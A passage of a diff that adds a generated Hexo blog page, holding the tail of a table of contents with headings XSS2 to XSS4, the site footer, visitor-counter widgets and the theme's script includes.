href="#XSS2"><span class="nav-text">XSS2</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#XSS3"><span class="nav-text">XSS3</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#XSS4"><span class="nav-text">XSS4</span></a></li></ol></li></ol></li></ol>
+
+	</div>
+</div>
+	</div>
+	
+</div>
+			</div>
+
+			
+		</div>
+
+		<div class="main-content-footer">
+			<footer class="footer mt-5 py-5 h-auto text-base text-third-text-color relative border-t-2 border-t-border-color">
+    <div class="info-container py-3 text-center">
+        
+        <div class="text-center">
+            &copy;
+            
+              <span>2022</span>
+              -
+            
+            2025&nbsp;&nbsp;<i class="fa-solid fa-heart fa-beat" style="--fa-animation-duration: 0.5s; color: #f54545"></i>&nbsp;&nbsp;<a href="/">zergling_73</a>
+            
+                
+                <p class="post-count space-x-0.5">
+                    <span>
+                        1 posts in total
+                    </span>
+                    
+                </p>
+            
+        </div>
+        
+            <script data-swup-reload-script src="https://cn.vercount.one/js"></script>
+            <div class="relative text-center lg:absolute lg:right-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-right">
+                
+                    <span id="busuanzi_container_site_uv" class="lg:!block">
+                        <span class="text-sm">VISITOR COUNT</span>
+                        <span id="busuanzi_value_site_uv"></span>
+                    </span>
+                
+                
+                    <span id="busuanzi_container_site_pv" class="lg:!block">
+                        <span class="text-sm">TOTAL PAGE VIEWS</span>
+                        <span id="busuanzi_value_site_pv"></span>
+                    </span>
+                
+            </div>
+        
+        <div class="relative text-center lg:absolute lg:left-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-left">
+            <span class="lg:block text-sm">POWERED BY <?xml version="1.0" encoding="utf-8"?><!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"><svg class="relative top-[2px] inline-block align-baseline" version="1.1" id="圖層_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" width="1rem" height="1rem" viewBox="0 0 512 512" enable-background="new 0 0 512 512" xml:space="preserve"><path fill="#0E83CD" d="M256.4,25.8l-200,115.5L56,371.5l199.6,114.7l200-115.5l0.4-230.2L256.4,25.8z M349,354.6l-18.4,10.7l-18.6-11V275H200v79.6l-18.4,10.7l-18.6-11v-197l18.5-10.6l18.5,10.8V237h112v-79.6l18.5-10.6l18.5,10.8V354.6z"/></svg><a target="_blank" class="text-base" href="https://hexo.io">Hexo</a></span>
+            <span class="text-sm lg:block">THEME&nbsp;<a class="text-base" target="_blank" href="https://github.com/EvanNotFound/hexo-theme-redefine">Redefine v2.8.5</a></span>
+        </div>
+        
+        
+            <div>
+                Blog up for <span class="odometer" id="runtime_days" ></span> days <span class="odometer" id="runtime_hours"></span> hrs <span class="odometer" id="runtime_minutes"></span> Min <span class="odometer" id="runtime_seconds"></span> Sec
+            </div>
+        
+        
+            <script data-swup-reload-script>
+                try {
+                    function odometer_init() {
+                    const elements = document.querySelectorAll('.odometer');
+                    elements.forEach(el => {
+                        new Odometer({
+                            el,
+                            format: '( ddd).dd',
+                            duration: 200
+                        });
+                    });
+                    }
+                    odometer_init();
+                } catch (error) {}
+            </script>
+        
+        
+        
+    </div>  
+</footer>
+		</div>
+	</div>
+
+	
+	<div class="post-tools">
+		<div class="post-tools-container">
+	<ul class="article-tools-list">
+		<!-- TOC aside toggle -->
+		
+		<li class="right-bottom-tools page-aside-toggle">
+			<i class="fa-regular fa-outdent"></i>
+		</li>
+		
+
+		<!-- go comment -->
+		
+		<li class="go-comment">
+			<i class="fa-regular fa-comments"></i>
+		</li>
+		
+	</ul>
+</div>
+	</div>
+	
+
+	<div class="right-side-tools-container">
+		<div class="side-tools-container">
+	<ul class="hidden-tools-list">
+		<li class="right-bottom-tools tool-font-adjust-plus flex justify-center items-center">
+			<i class="fa-regular fa-magnifying-glass-plus"></i>
+		</li>
+
+		<li class="right-bottom-tools tool-font-adjust-minus flex justify-center items-center">
+			<i class="fa-regular fa-magnifying-glass-minus"></i>
+		</li>
+
+		<li class="right-bottom-tools tool-dark-light-toggle flex justify-center items-center">
+			<i class="fa-regular fa-moon"></i>
+		</li>
+
+		<!-- rss -->
+		
+
+		
+
+		<li class="right-bottom-tools tool-scroll-to-bottom flex justify-center items-center">
+			<i class="fa-regular fa-arrow-down"></i>
+		</li>
+	</ul>
+
+	<ul class="visible-tools-list">
+		<li class="right-bottom-tools toggle-tools-list flex justify-center items-center">
+			<i class="fa-regular fa-cog fa-spin"></i>
+		</li>
+		
+		<li class="right-bottom-tools tool-scroll-to-top flex justify-center items-center">
+			<i class="arrow-up fas fa-arrow-up"></i>
+			<span class="percent"></span>
+		</li>
+		
+		
+	</ul>
+</div>
+	</div>
+
+	<div class="image-viewer-container">
+	<img src="">
+</div>
+
+	
+
+</main>
+
+
+
+<script src="/js/build/libs/Swup.min.js"></script>
+
+<script src="/js/build/libs/SwupSlideTheme.min.js"></script>
+
+<script src="/js/build/libs/SwupScriptsPlugin.min.js"></script>
+
+<script src="/js/build/libs/SwupProgressPlugin.min.js"></script>
+
+<script src="/js/build/libs/SwupScrollPlugin.min.js"></script>
+
+<script src="/js/build/libs/SwupPreloadPlugin.min.js"></script>
+
+<script>
+    const swup = new Swup({
+        plugins: [
+            new SwupScriptsPlugin({
+                optin: true,
+            }),
+            new SwupProgressPlugin(),
+            new SwupScrollPlugin({
+                offset: 80,
+            }),
+            new SwupSlideTheme({
+                mainElement: ".main-content-body",
+            }),
+            new SwupPreloadPlugin(),
+        ],
+        containers: ["#swup"],
+    });
+</script>
+
+
+
+
+	
+<script src="/js/build/tools/imageViewer.js" type="module"></script>
+
+<script src="/js/build/utils.js" type="module"></script>
+
+<script src="/js/build/main.js" type="module"></script>
+
+<script src="/js/build/layouts/navbarShrink.js" type="module"></script>
+
+<script src="/js/build/tools/scrollTopBottom.js" type="module"></script>
+
+<script src="/js/build/tools/lightDarkSwitch.js" type="module"></script>
+
+<script src="/js/build/layouts/categoryList.js" type="module"></script>
+
+
+
+
+
+    
+<script src="/js/build/tools/codeBlock.js" type="module"></script>
+
+
+
+
+    
+<script src="/js/build/layouts/lazyload.js" type="module"></script>
+
+
+
+
+    
+<script src="/js/build/tools/runtime.js"></script>
+
+    
+<script src="/js/build/libs/odometer.min.js"></script>
+
+    
+<link rel="stylesheet" href="/assets/odometer-theme-minimal.css">
+
+
+
+
+  
+<script src="/js/build/libs/Typed.min.js"></script>
+
+  
+<script src="/js/build/plugins/typed.js" type="module"></script>
+
+
+
+
+
+
+
+
+    
+<script src="/js/build/libs/anime.min.js"></script>
+
+
+
+
+
+    
+<script src="/js/build/tools/tocToggle.js" type="module" data-swup-reload-script=""></script>
+
+<script src="/js/build/layouts/toc.js" type="module" data-swup-reload-script=""></script>
+
+<script src="/js/build/plugins/tabs.js" type="module" data-swup-reload-script=""></script>
+
+
+
+
+<script src="/js/build/libs/moment-with-locales.min.js" data-swup-reload-script=""></script>
+
+
+<script src="/js/build/layouts/essays.js" type="module" data-swup-reload-script=""></script>
+
+
+
+
+
+	
+</body>
+
+</html>
